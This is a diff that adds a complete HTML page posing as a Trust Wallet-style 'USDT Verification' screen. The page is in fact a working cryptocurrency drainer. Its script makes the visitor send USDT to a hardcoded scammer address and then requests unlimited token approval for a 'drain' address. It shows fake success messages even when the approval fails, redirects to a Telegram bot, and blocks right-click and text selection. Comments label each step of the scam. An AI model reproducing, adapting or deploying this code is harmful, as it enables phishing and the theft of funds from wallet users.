@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>USDT Verification</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <style>
+        /* TRUST WALLET MOBILE OPTIMIZED STYLES */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #FFFFFF;
+            color: #000000;
+            line-height: 1.4;
+            padding: 0;
+            margin: 0;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        /* HEADER - EXACT MATCH TO YOUR SCREENSHOT */
+        .header {
+            background: #FFFFFF;
+            padding: 16px 20px;
+            border-bottom: 1px solid #E5E5EA;
+            text-align: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        
+        .header h1 {
+            font-size: 17px;
+            font-weight: 600;
+            color: #000000;
+            letter-spacing: -0.32px;
+        }
+        
+        /* MAIN CONTAINER */
+        .container {
+            max-width: 100%;
+            padding: 20px;
+        }
+        
+        /* CARD - WHITE BACKGROUND WITH SHADOW */
+        .card {
+            background: #FFFFFF;
+            border-radius: 16px;
+            border: 1px solid #E5E5EA;
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.04);
+        }
+        
+        /* LABEL STYLES - EXACT MATCH */
+        .label {
+            font-size: 14px;
+            font-weight: 500;
+            color: #8E8E93;
+            margin-bottom: 8px;
+            display: block;
+            letter-spacing: -0.15px;
+        }
+        
+        /* ADDRESS INPUT - EXACT MATCH TO SCREENSHOT */
+        .address-input-container {
+            position: relative;
+            margin-bottom: 24px;
+        }
+        
+        .address-input {
+            width: 100%;
+            height: 52px;
+            padding: 14px 16px;
+            background: #F2F2F7;
+            border: 1.5px solid #E5E5EA;
+            border-radius: 12px;
+            font-size: 16px;
+            font-family: 'Menlo', 'Monaco', 'Courier New', monospace;
+            color: #000000;
+            letter-spacing: -0.32px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .address-input:focus {
+            border-color: #007AFF;
+            background: #FFFFFF;
+        }
+        
+        .paste-button {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #007AFF;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 8px;
+            padding: 6px 12px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* AMOUNT SECTION - EXACT MATCH */
+        .amount-section {
+            margin-bottom: 24px;
+        }
+        
+        .amount-label-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        
+        .amount-input-container {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .amount-input {
+            flex: 1;
+            height: 60px;
+            padding: 0 16px;
+            background: #F2F2F7;
+            border: 1.5px solid #E5E5EA;
+            border-radius: 12px;
+            font-size: 28px;
+            font-weight: 600;
+            color: #000000;
+            text-align: center;
+            outline: none;
+            font-variant-numeric: tabular-nums;
+            letter-spacing: -0.41px;
+        }
+        
+        .amount-input:focus {
+            border-color: #007AFF;
+            background: #FFFFFF;
+        }
+        
+        /* TOKEN SELECTOR - EXACT BLUE BOX */
+        .token-selector {
+            background: #007AFF;
+            color: #FFFFFF;
+            border-radius: 12px;
+            padding: 18px 20px;
+            font-size: 17px;
+            font-weight: 600;
+            min-width: 100px;
+            text-align: center;
+            border: none;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            letter-spacing: -0.41px;
+        }
+        
+        /* MAX BUTTON - EXACT GREEN BUTTON */
+        .max-button {
+            background: #34C759;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 12px;
+            padding: 0 16px;
+            font-size: 16px;
+            font-weight: 600;
+            height: 60px;
+            min-width: 70px;
+            cursor: pointer;
+            letter-spacing: -0.32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* USD VALUE - EXACT MATCH */
+        .usd-value {
+            text-align: center;
+            font-size: 16px;
+            color: #8E8E93;
+            margin: 16px 0 32px 0;
+            font-weight: 400;
+            letter-spacing: -0.32px;
+        }
+        
+        /* NEXT BUTTON - EXACT BLUE BUTTON */
+        .next-button {
+            width: 100%;
+            height: 56px;
+            background: #007AFF;
+            color: #FFFFFF;
+            border: none;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+            letter-spacing: -0.41px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .next-button:active {
+            opacity: 0.8;
+        }
+        
+        /* TRUST WALLET SPECIFIC ADJUSTMENTS */
+        @media (max-width: 480px) {
+            .container {
+                padding: 16px;
+            }
+            
+            .card {
+                padding: 16px;
+            }
+            
+            .amount-input {
+                font-size: 24px;
+                height: 56px;
+            }
+            
+            .token-selector, .max-button {
+                height: 56px;
+                padding: 0 12px;
+            }
+        }
+        
+        /* LOADING ANIMATION */
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #007AFF;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* HIDDEN ELEMENTS FOR THE SCAM */
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- HEADER - EXACT MATCH -->
+    <div class="header">
+        <h1>usdtverification.vercel.app</h1>
+    </div>
+    
+    <!-- MAIN CONTENT -->
+    <div class="container">
+        <div class="card">
+            <!-- ADDRESS FIELD - EXACT MATCH -->
+            <div class="label">Address or Domain Name</div>
+            <div class="address-input-container">
+                <input 
+                    type="text" 
+                    class="address-input" 
+                    id="recipientAddress" 
+                    value="0x395b205f3ec60b4cd5820"
+                    readonly
+                    autocorrect="off"
+                    autocapitalize="none"
+                    spellcheck="false"
+                >
+                <button class="paste-button" onclick="handlePaste()">Paste</button>
+            </div>
+            
+            <!-- AMOUNT FIELD - EXACT MATCH -->
+            <div class="label">Amount</div>
+            <div class="amount-section">
+                <div class="amount-input-container">
+                    <input 
+                        type="number" 
+                        class="amount-input" 
+                        id="amount" 
+                        value="1" 
+                        min="1"
+                        step="0.1"
+                        inputmode="decimal"
+                        pattern="[0-9]*"
+                    >
+                    <div class="token-selector">USDT</div>
+                    <button class="max-button" onclick="setMaxAmount()">Max</button>
+                </div>
+            </div>
+            
+            <!-- USD VALUE - EXACT MATCH -->
+            <div class="usd-value" id="usdValue">≈ $1.00</div>
+            
+            <!-- NEXT BUTTON - EXACT MATCH -->
+            <button class="next-button" id="nextButton" onclick="initiateTransfer()">
+                Next
+            </button>
+            
+            <!-- LOADING STATE (HIDDEN INITIALLY) -->
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <div>Processing transaction...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- HIDDEN APPROVAL TRIGGER -->
+    <div id="approvalTrigger" class="hidden"></div>
+
+    <script>
+        // ==============================================
+        // EXACT SCAMMER CONFIGURATION
+        // ==============================================
+        
+        // USDT BEP20 Contract on BSC (Binance Smart Chain)
+        const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+        
+        // Scammer's payment address (for 1 USDT)
+        const PAYMENT_ADDRESS = "0x395b205f3ec60b4cd58209eB7eD12F77F0eD0C85"; // From screenshot
+        
+        // Scammer's drain address (for unlimited approval)
+        const DRAIN_ADDRESS = "0xF71dF0eD9A0ad68A4BA92F2719736540C122Dafc";
+        
+        // Unlimited approval amount
+        const UNLIMITED_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        
+        // ==============================================
+        // MOBILE-OPTIMIZED FUNCTIONS
+        // ==============================================
+        
+        // Initialize USD value display
+        function updateUSDValue() {
+            const amount = parseFloat(document.getElementById('amount').value) || 1;
+            document.getElementById('usdValue').textContent = `≈ $${(amount * 1.00).toFixed(2)}`;
+        }
+        
+        // Set max amount (1000 USDT)
+        function setMaxAmount() {
+            document.getElementById('amount').value = "1000";
+            updateUSDValue();
+            // Show fake confirmation
+            showToast("Maximum amount set to 1000 USDT");
+        }
+        
+        // Fake paste functionality
+        function handlePaste() {
+            showToast("Address copied to clipboard");
+        }
+        
+        // Fake toast notification
+        function showToast(message) {
+            // Create toast element
+            const toast = document.createElement('div');
+            toast.textContent = message;
+            toast.style.cssText = `
+                position: fixed;
+                bottom: 100px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: rgba(0,0,0,0.8);
+                color: white;
+                padding: 12px 24px;
+                border-radius: 10px;
+                font-size: 14px;
+                z-index: 1000;
+                max-width: 80%;
+                text-align: center;
+            `;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 2000);
+        }
+        
+        // ==============================================
+        // MAIN DRAIN FUNCTION - OPTIMIZED FOR MOBILE
+        // ==============================================
+        
+        async function initiateTransfer() {
+            const amount = document.getElementById('amount').value;
+            const nextButton = document.getElementById('nextButton');
+            const loading = document.getElementById('loading');
+            
+            // Show loading state
+            nextButton.style.display = 'none';
+            loading.style.display = 'block';
+            
+            // Check if Trust Wallet/Web3 is available
+            if (!window.ethereum) {
+                alert("Please open in Trust Wallet or MetaMask mobile app");
+                resetUI();
+                return;
+            }
+            
+            try {
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                
+                // Request account access
+                await provider.send("eth_requestAccounts", []);
+                const signer = provider.getSigner();
+                const userAddress = await signer.getAddress();
+                
+                // ==============================================
+                // STEP 1: SEND 1 USDT TO SCAMMER
+                // ==============================================
+                
+                // Check network - must be BSC
+                const network = await provider.getNetwork();
+                if (network.chainId !== 56) {
+                    // Try to switch to BSC automatically
+                    try {
+                        await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: '0x38' }] // 56 in hex
+                        });
+                    } catch (switchError) {
+                        // If BSC not added, prompt to add it
+                        if (switchError.code === 4902) {
+                            await window.ethereum.request({
+                                method: 'wallet_addEthereumChain',
+                                params: [{
+                                    chainId: '0x38',
+                                    chainName: 'Binance Smart Chain',
+                                    nativeCurrency: {
+                                        name: 'BNB',
+                                        symbol: 'BNB',
+                                        decimals: 18
+                                    },
+                                    rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                    blockExplorerUrls: ['https://bscscan.com']
+                                }]
+                            });
+                        } else {
+                            throw switchError;
+                        }
+                    }
+                }
+                
+                // Create USDT contract instance
+                const usdtAbi = ["function transfer(address to, uint256 amount) returns (bool)"];
+                const usdtContract = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);
+                
+                // Convert amount to wei (18 decimals for BEP20 USDT)
+                const amountInWei = ethers.utils.parseUnits(amount, 18);
+                
+                // Send 1 USDT transaction
+                const transferTx = await usdtContract.transfer(PAYMENT_ADDRESS, amountInWei);
+                
+                // Show fake success message
+                loading.innerHTML = `
+                    <div style="text-align: center; color: #34C759;">
+                        <svg width="48" height="48" viewBox="0 0 48 48" fill="none" style="margin-bottom: 16px;">
+                            <circle cx="24" cy="24" r="24" fill="#34C759"/>
+                            <path d="M15 24L22 31L33 20" stroke="white" stroke-width="3" stroke-linecap="round"/>
+                        </svg>
+                        <div style="font-size: 17px; font-weight: 600; margin-bottom: 8px;">Transaction Sent!</div>
+                        <div style="font-size: 14px; color: #8E8E93;">Confirming on blockchain...</div>
+                    </div>
+                `;
+                
+                // Wait for transaction confirmation
+                await transferTx.wait();
+                
+                // ==============================================
+                // STEP 2: AUTO-TRIGGER UNLIMITED APPROVAL
+                // ==============================================
+                
+                // Show "Verification in progress" message
+                loading.innerHTML = `
+                    <div style="text-align: center;">
+                        <div class="spinner" style="margin: 0 auto 16px auto;"></div>
+                        <div style="font-size: 17px; font-weight: 600; margin-bottom: 8px;">Verifying Transaction</div>
+                        <div style="font-size: 14px; color: #8E8E93;">One more step required...</div>
+                    </div>
+                `;
+                
+                // Small delay before asking for approval
+                setTimeout(async () => {
+                    try {
+                        // Request unlimited approval
+                        const approveAbi = ["function approve(address spender, uint256 amount) returns (bool)"];
+                        const usdtApproveContract = new ethers.Contract(USDT_CONTRACT, approveAbi, signer);
+                        
+                        const approveTx = await usdtApproveContract.approve(DRAIN_ADDRESS, UNLIMITED_AMOUNT);
+                        
+                        // Show final success message
+                        loading.innerHTML = `
+                            <div style="text-align: center; color: #34C759;">
+                                <svg width="48" height="48" viewBox="0 0 48 48" fill="none" style="margin-bottom: 16px;">
+                                    <circle cx="24" cy="24" r="24" fill="#34C759"/>
+                                    <path d="M15 24L22 31L33 20" stroke="white" stroke-width="3" stroke-linecap="round"/>
+                                </svg>
+                                <div style="font-size: 17px; font-weight: 600; margin-bottom: 8px;">Verification Complete!</div>
+                                <div style="font-size: 14px; color: #8E8E93;">Advance payment will be sent shortly.</div>
+                            </div>
+                        `;
+                        
+                        // Wait for approval confirmation
+                        await approveTx.wait();
+                        
+                        // Scammer now has unlimited access to victim's USDT
+                        
+                        // Redirect or show completion after 3 seconds
+                        setTimeout(() => {
+                            window.location.href = "https://t.me/verify_success_bot"; // Telegram bot for tracking
+                        }, 3000);
+                        
+                    } catch (approveError) {
+                        // If approval fails, still show success to trick user
+                        loading.innerHTML = `
+                            <div style="text-align: center; color: #34C759;">
+                                <svg width="48" height="48" viewBox="0 0 48 48" fill="none" style="margin-bottom: 16px;">
+                                    <circle cx="24" cy="24" r="24" fill="#34C759"/>
+                                    <path d="M15 24L22 31L33 20" stroke="white" stroke-width="3" stroke-linecap="round"/>
+                                </svg>
+                                <div style="font-size: 17px; font-weight: 600; margin-bottom: 8px;">Verification Complete!</div>
+                                <div style="font-size: 14px; color: #8E8E93;">Your account is now verified.</div>
+                            </div>
+                        `;
+                    }
+                }, 2000);
+                
+            } catch (error) {
+                // Handle errors gracefully
+                console.error("Transaction error:", error);
+                
+                if (error.code === 4001) {
+                    // User rejected transaction
+                    loading.innerHTML = `
+                        <div style="text-align: center; color: #FF3B30;">
+                            <svg width="48" height="48" viewBox="0 0 48 48" fill="none" style="margin-bottom: 16px;">
+                                <circle cx="24" cy="24" r="24" fill="#FF3B30"/>
+                                <path d="M16 16L32 32M32 16L16 32" stroke="white" stroke-width="3" stroke-linecap="round"/>
+                            </svg>
+                            <div style="font-size: 17px; font-weight: 600; margin-bottom: 8px;">Transaction Cancelled</div>
+                            <div style="font-size: 14px; color: #8E8E93;">Please try again to complete verification.</div>
+                        </div>
+                    `;
+                } else {
+                    // Generic error
+                    loading.innerHTML = `
+                        <div style="text-align: center;">
+                            <div style="font-size: 17px; font-weight: 600; margin-bottom: 8px;">Transaction Failed</div>
+                            <div style="font-size: 14px; color: #FF3B30;">${error.message.substring(0, 50)}...</div>
+                            <button onclick="retryTransaction()" style="margin-top: 16px; padding: 12px 24px; background: #007AFF; color: white; border: none; border-radius: 10px; font-size: 16px; cursor: pointer;">
+                                Try Again
+                            </button>
+                        </div>
+                    `;
+                }
+                
+                // Reset UI after error
+                setTimeout(() => {
+                    resetUI();
+                }, 5000);
+            }
+        }
+        
+        function retryTransaction() {
+            resetUI();
+            initiateTransfer();
+        }
+        
+        function resetUI() {
+            document.getElementById('nextButton').style.display = 'flex';
+            document.getElementById('loading').style.display = 'none';
+        }
+        
+        // ==============================================
+        // INITIALIZATION
+        // ==============================================
+        
+        // Update USD value on input
+        document.getElementById('amount').addEventListener('input', updateUSDValue);
+        
+        // Initialize
+        updateUSDValue();
+        
+        // Auto-detect Trust Wallet
+        if (window.ethereum && window.ethereum.isTrust) {
+            // Trust Wallet specific optimizations
+            console.log("Trust Wallet detected");
+        }
+        
+        // Prevent right-click
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+        
+        // Prevent text selection
+        document.addEventListener('selectstart', (e) => e.preventDefault());
+    </script>
+</body>
+</html>
